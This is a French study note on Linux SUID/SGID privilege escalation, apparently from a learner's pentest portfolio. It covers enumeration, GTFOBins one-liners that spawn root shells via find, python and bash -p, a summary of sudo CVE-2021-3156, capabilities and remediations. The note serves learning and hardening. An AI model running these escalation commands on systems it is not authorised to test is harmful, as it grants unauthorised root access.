# SUID / SGID — Élévation de privilèges

## Définition

Le bit SUID (Set User ID) sur un exécutable permet de l'exécuter avec les droits
du propriétaire du fichier — souvent root — quel que soit l'utilisateur qui le lance.
Si un binaire SUID offre des fonctionnalités permettant d'exécuter du code
ou de lire des fichiers arbitraires, il peut être détourné pour élever les privilèges.

Le bit SGID (Set Group ID) fonctionne de la même façon, mais avec les droits du groupe propriétaire.

---

## Énumération

```bash
# Fichiers SUID appartenant à root
find / -user root -perm -4000 -type f 2>/dev/null

# Variante étendue (tous SUID, pas seulement root)
find / -perm -4000 -type f 2>/dev/null

# Fichiers SGID
find / -perm -2000 -type f 2>/dev/null

# Capabilities Linux (alternative au SUID)
getcap -r / 2>/dev/null
```

Binaires inconnus dans `/tmp`, `/home`, `/opt` ou répertoires utilisateurs → priorité haute.

---

## Binaires SUID courants et risques associés

| Binaire | Risque | Action recommandée |
|---|---|---|
| `bash` avec SUID | Shell root direct — critique | Retirer immédiatement |
| `find` avec SUID | Exécution de commandes via `-exec` | Retirer le bit SUID |
| `python` / `perl` | Exécution de scripts en root | Retirer le bit SUID |
| `cp` / `mv` | Écrasement de fichiers système | Retirer le bit SUID |
| `nano` / `vim` | Édition de fichiers système | Retirer le bit SUID |
| `nmap` (ancien) | Shell interactif (`--interactive`) | Retirer le bit SUID |

---

## Exploitation — GTFOBins

Si un binaire apparaît dans la liste SUID, chercher son nom sur [gtfobins.github.io](https://gtfobins.github.io/) — section **SUID**.

```bash
# find SUID → -exec pour obtenir un shell root
find . -exec /bin/bash -p \;
# -p conserve les droits SUID (effective UID = root)

# python SUID → os.setuid(0) + shell
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# bash avec SUID
bash -p
```

Rencontré en lab : le binaire `find` avec bit SUID/SGID dans un répertoire utilisateur
(pentest EvilCorp, VULN-02, CVSS 7.8) — voir le [rapport de pentest](https://github.com/Remy-Miquel/pentest-lab-report-portfolio).

---

## CVE-2021-3156 — Baron Samedit (sudo)

Vulnérabilité dans `sudo` (versions < 1.9.5p2) permettant à un utilisateur local
sans droits sudo d'obtenir un shell root via un buffer overflow dans `sudoedit`.

| Élément | Détail |
|---|---|
| CVE | CVE-2021-3156 |
| Versions affectées | sudo < 1.9.5p2 |
| Vérification | `sudo --version` puis `sudoedit -s /` |
| Impact | Élévation de privilèges locale vers root |
| Remédiation | `apt upgrade sudo` ou `yum update sudo` |

---

## Capabilities Linux

Les capabilities permettent d'accorder des droits fins sans SUID complet.
Certaines sont aussi dangereuses qu'un SUID root :

```bash
getcap -r / 2>/dev/null
```

| Capability | Risque |
|---|---|
| `cap_setuid+ep` | Changer son UID → root |
| `cap_net_raw+ep` | Sniffing réseau |
| `cap_dac_override+ep` | Ignorer les permissions sur les fichiers |

---

## Remédiations

- Auditer régulièrement : `find / -perm -u=s -type f 2>/dev/null`
- Retirer les bits SUID non justifiés : `chmod u-s /chemin/binaire`
- Auditer les capabilities : `getcap -r /` et retirer avec `setcap -r /chemin/binaire`
- Aucun binaire ne devrait être SUID sans raison documentée
- Maintenir les packages à jour — CVE-2021-3156 cible sudo, d'autres CVEs ciblent les binaires SUID

---

## Ce que j'ai appris

- La différence SUID (droits propriétaire) / SGID (droits groupe) / capabilities (droits granulaires)
- Pourquoi `-p` est nécessaire avec bash SUID — sans lui, bash abandonne les droits élevés au démarrage
- GTFOBins comme référence systématique : si un binaire a SUID, il y a probablement un exploit documenté
- L'importance de vérifier `/tmp` et les répertoires utilisateurs — un SUID déposé là est souvent intentionnel (ou suspect)
